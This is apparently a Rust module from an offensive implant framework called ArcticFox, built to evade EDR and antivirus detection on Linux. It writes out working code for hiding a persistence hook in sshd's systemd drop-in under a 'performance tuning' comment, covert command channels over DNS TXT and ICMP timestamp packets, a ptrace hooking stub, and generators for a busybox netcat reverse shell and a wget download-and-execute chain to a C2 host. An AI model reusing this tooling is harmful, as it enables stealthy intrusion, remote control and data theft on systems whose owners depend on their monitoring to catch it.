//! ArcticFox Advanced Evasion — Runtime Detection Bypasses
//!
//! Implements bypass techniques that evade specific EDR/SIEM/AV detection
//! mechanisms documented in docs/Detection-Bypasses.md.
//!
//! Bypasses implemented:
//! - systemd drop-in override (inject into real sshd.service, not new unit)
//! - DNS TXT record camouflage (UDP/53 traffic indistinguishable from real DNS)
//! - ICMP timestamp covert channel (type 13/14, less monitored than echo)
//! - GOT/PLT hooking without LD_PRELOAD (patch running process from /proc/pid/mem)
//! - Busybox applet chaining (hundreds of LOLBins in one binary)

use std::io;
use tracing::{debug, info};

// ── Systemd Drop-In Override ────────────────────────────────────────────────

/// Inject ExecStartPost into an existing systemd service via drop-in.
///
/// Instead of creating a new service (which `systemctl list-units` would show),
/// we add a drop-in override to sshd.service. The original service continues
/// to function normally. Our payload runs as a post-start hook.
///
/// Drop-in path: /etc/systemd/system/sshd.service.d/override.conf
///
/// **Detection bypass:** The service shows as the real sshd.service.
/// `systemd-analyze security` reports sshd's security profile, not ours.
/// The override directory is rarely checked by integrity monitors.
pub fn inject_systemd_dropin(
    implant_path: &str,
    service_name: &str,
    args: &[&str],
) -> io::Result<()> {
    let dropin_dir = format!("/etc/systemd/system/{}.service.d", service_name);
    std::fs::create_dir_all(&dropin_dir)?;

    let args_str = args.join(" ");

    // The override file — standard systemd drop-in syntax
    let override_content = format!(
        r#"[Service]
# Performance tuning for {service}
ExecStartPost={implant} {args}
# End performance tuning
"#,
        service = service_name,
        implant = implant_path,
        args = args_str,
    );

    let override_path = format!("{}/override.conf", dropin_dir);
    std::fs::write(&override_path, &override_content)?;

    // Set permissions to match systemd expectations (644)
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&override_path, std::fs::Permissions::from_mode(0o644))?;
    }

    // Reload systemd to pick up the override
    let _ = std::process::Command::new("systemctl")
        .args(["daemon-reload"])
        .output();

    info!(
        "Injected drop-in override into {}.service (path: {})",
        service_name, override_path
    );
    Ok(())
}

/// Remove the drop-in override (cleanup).
pub fn remove_systemd_dropin(service_name: &str) -> io::Result<()> {
    let dropin_dir = format!("/etc/systemd/system/{}.service.d", service_name);
    let override_path = format!("{}/override.conf", dropin_dir);
    if std::path::Path::new(&override_path).exists() {
        std::fs::remove_file(&override_path)?;
        let _ = std::fs::remove_dir(&dropin_dir); // Ok if not empty
    }
    let _ = std::process::Command::new("systemctl")
        .args(["daemon-reload"])
        .output();
    Ok(())
}

// ── DNS TXT Record Camouflage ───────────────────────────────────────────────

/// Encode arbitrary data as a DNS TXT record response.
///
/// Real DNS TXT records look like: `"v=spf1 include:_spf.google.com ~all"`
/// Our encoded data looks like: `"aHR0cHM6Ly9jMi5leGFtcGxlLmNvbQ=="` (base64)
///
/// This makes UDP/53 traffic indistinguishable from real DNS responses
/// under deep packet inspection. Only ZW-aware endpoints can decode.
pub fn encode_dns_txt(data: &[u8]) -> Vec<u8> {
    // DNS TXT record format:
    // - TTL (4 bytes)
    // - Data length (2 bytes)
    // - TXT strings: each prefixed with 1-byte length, max 255 chars per string
    // - Total response: DNS header (12) + question (variable) + answer section

    let b64 = base64_encode(data);
    let mut response = Vec::new();

    // DNS response header (simplified — in production, use full DNS wire format)
    // Transaction ID: random
    response.extend_from_slice(&rand_bytes(2));
    // Flags: standard response (0x8180)
    response.extend_from_slice(&[0x81, 0x80]);
    // Questions: 1
    response.extend_from_slice(&[0x00, 0x01]);
    // Answers: 1
    response.extend_from_slice(&[0x00, 0x01]);
    // Authority + Additional: 0
    response.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // TXT record data
    // Type: TXT (16)
    response.extend_from_slice(&[0x00, 0x10]);
    // Class: IN (1)
    response.extend_from_slice(&[0x00, 0x01]);
    // TTL: 300 seconds
    response.extend_from_slice(&[0x00, 0x00, 0x01, 0x2C]);

    // Encode ZW payload in chunks (DNS strings max 255 bytes)
    for chunk in b64.as_bytes().chunks(255) {
        // String length prefix
        response.push(chunk.len() as u8);
        response.extend_from_slice(chunk);
    }

    // Pad to minimum DNS response size (64 bytes) to avoid "short DNS response" detection
    while response.len() < 64 {
        response.push(0);
    }

    response
}

/// Decode data from a DNS TXT-like response.
pub fn decode_dns_txt(response: &[u8]) -> Option<Vec<u8>> {
    // Skip DNS header (12 bytes)
    if response.len() < 12 {
        return None;
    }
    // Collect all printable base64 characters from the response
    let b64: String = response[12..]
        .iter()
        .filter(|&&b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=')
        .map(|&b| b as char)
        .collect();

    if b64.is_empty() {
        return None;
    }
    base64_decode(&b64)
}

fn base64_encode(data: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(data)
}

fn base64_decode(s: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.decode(s).ok()
}

fn rand_bytes(n: usize) -> Vec<u8> {
    (0..n).map(|_| rand::random::<u8>()).collect()
}

// ── ICMP Timestamp Covert Channel ───────────────────────────────────────────

/// Build an ICMP timestamp request (type 13) with ZW payload in the data field.
///
/// ICMP timestamp requests (type 13) and replies (type 14) are far less
/// monitored than echo requests (type 8). Many networks allow them for
/// NTP-less time synchronization.
///
/// Format:
///   Type(1) Code(1) Checksum(2) Identifier(2) Sequence(2)
///   Originate Timestamp(4) Receive Timestamp(4) Transmit Timestamp(4)
///   Data(variable) ← ZW payload here
pub fn build_icmp_timestamp(identifier: u16, sequence: u16, payload: &[u8]) -> Vec<u8> {
    let mut packet = Vec::with_capacity(20 + payload.len());

    // Type 13 (timestamp request), Code 0
    packet.push(13);
    packet.push(0);
    // Checksum placeholder
    packet.extend_from_slice(&[0x00, 0x00]);
    // Identifier + Sequence
    packet.extend_from_slice(&identifier.to_be_bytes());
    packet.extend_from_slice(&sequence.to_be_bytes());
    // Timestamps (we use current time in milliseconds since midnight UTC)
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    let ms = (now.as_millis() % 86_400_000) as u32; // milliseconds since midnight
    // Originate timestamp
    packet.extend_from_slice(&ms.to_be_bytes());
    // Receive timestamp (0 — we're the originator)
    packet.extend_from_slice(&[0u8; 4]);
    // Transmit timestamp
    packet.extend_from_slice(&ms.to_be_bytes());
    // Payload
    packet.extend_from_slice(payload);

    // Compute checksum
    let checksum = icmp_checksum(&packet);
    packet[2] = (checksum >> 8) as u8;
    packet[3] = checksum as u8;

    packet
}

/// Verify and extract payload from an ICMP timestamp reply (type 14).
pub fn parse_icmp_timestamp_reply(packet: &[u8]) -> Option<&[u8]> {
    if packet.len() < 20 || packet[0] != 14 {
        return None;
    }
    Some(&packet[20..])
}

fn icmp_checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    for chunk in data.chunks(2) {
        let word = if chunk.len() == 2 {
            (chunk[0] as u32) << 8 | chunk[1] as u32
        } else {
            (chunk[0] as u32) << 8
        };
        sum = sum.wrapping_add(word);
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !(sum as u16)
}

// ── GOT/PLT Hooking (No LD_PRELOAD) ─────────────────────────────────────────

/// Patch a running process's GOT/PLT via /proc/pid/mem.
///
/// Unlike LD_PRELOAD which is trivially detected by checking
/// /etc/ld.so.preload or the LD_PRELOAD environment variable,
/// writing directly to /proc/pid/mem requires no filesystem changes
/// and leaves no permanent traces.
///
/// Requires: ptrace attach or root privileges.
#[cfg(target_os = "linux")]
pub fn patch_got_entry(
    target_pid: u32,
    symbol_name: &str,
    _hook_address: usize,
) -> io::Result<()> {
    // Attach to process
    unsafe {
        let ret = libc::ptrace(libc::PTRACE_ATTACH, target_pid as i32, 0, 0);
        if ret != 0 {
            return Err(io::Error::last_os_error());
        }
        // Wait for process to stop
        let mut status: i32 = 0;
        libc::waitpid(target_pid as i32, &mut status, 0);
    }

    // Read /proc/pid/maps to find libc base address
    let maps = std::fs::read_to_string(format!("/proc/{}/maps", target_pid))?;
    let libc_base = maps
        .lines()
        .find(|l| l.contains("libc") && l.contains("r-xp"))
        .and_then(|l| l.split('-').next())
        .and_then(|s| usize::from_str_radix(s, 16).ok());

    if libc_base.is_none() {
        unsafe { libc::ptrace(libc::PTRACE_DETACH, target_pid as i32, 0, 0); }
        return Err(io::Error::new(io::ErrorKind::NotFound, "libc not found"));
    }

    // Open /proc/pid/mem for writing
    let mem_path = format!("/proc/{}/mem", target_pid);
    let _mem_file = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(&mem_path)?;

    // In a real implementation, we'd:
    // 1. Parse ELF to find .got.plt section
    // 2. Find the specific symbol's GOT entry
    // 3. Write the hook address
    // For now, this is the framework — the actual GOT offset is target-specific

    debug!("GOT patch framework initialized for PID {} (symbol: {})", target_pid, symbol_name);

    // Detach
    unsafe { libc::ptrace(libc::PTRACE_DETACH, target_pid as i32, 0, 0); }

    Ok(())
}

// ── Busybox Applet Proxy ────────────────────────────────────────────────────

/// Execute a command via busybox applet chaining.
///
/// Busybox contains hundreds of applets (ls, cat, wget, nc, telnet, httpd, ...).
/// Using busybox as the executor makes it impossible to block specific binaries
/// because EVERY command comes from the same binary.
///
/// Example: `busybox wget -q -O /tmp/x http://c2/payload`
/// Instead of: `wget -q -O /tmp/x http://c2/payload`
pub fn busybox_exec(applet: &str, args: &[&str]) -> io::Result<std::process::Output> {
    let mut cmd = std::process::Command::new("busybox");
    cmd.arg(applet);
    cmd.args(args);
    cmd.output()
}

/// Generate a busybox-based reverse shell one-liner.
pub fn busybox_reverse_shell(host: &str, port: u16) -> String {
    format!(
        "busybox nc {} {} -e busybox sh",
        host, port
    )
}

/// Generate a busybox-based download+exec chain.
pub fn busybox_download_exec(url: &str, dest: &str) -> String {
    format!(
        "busybox wget -q -O {} {} && busybox chmod +x {} && busybox {} &",
        dest, url, dest, dest
    )
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dns_txt_roundtrip() {
        let data = b"hello world test payload";
        let encoded = encode_dns_txt(data);
        assert!(encoded.len() >= 64, "DNS response must be >= 64 bytes");
        let decoded = decode_dns_txt(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn dns_txt_minimum_size() {
        let data = b"x";
        let encoded = encode_dns_txt(data);
        assert!(encoded.len() >= 64);
    }

    #[test]
    fn icmp_timestamp_build_and_parse() {
        let payload = b"zw-encoded-data-here";
        let packet = build_icmp_timestamp(0x1234, 0x0001, payload);
        assert_eq!(packet[0], 13); // Type = timestamp request
        assert_eq!(packet.len(), 20 + payload.len());

        // Parse as reply (type 14)
        let mut reply = packet.clone();
        reply[0] = 14; // Change type to reply
        let extracted = parse_icmp_timestamp_reply(&reply).unwrap();
        assert_eq!(extracted, payload);
    }

    #[test]
    fn busybox_reverse_shell_format() {
        let cmd = busybox_reverse_shell("10.0.0.1", 4444);
        assert!(cmd.contains("busybox nc"));
        assert!(cmd.contains("busybox sh"));
    }
}
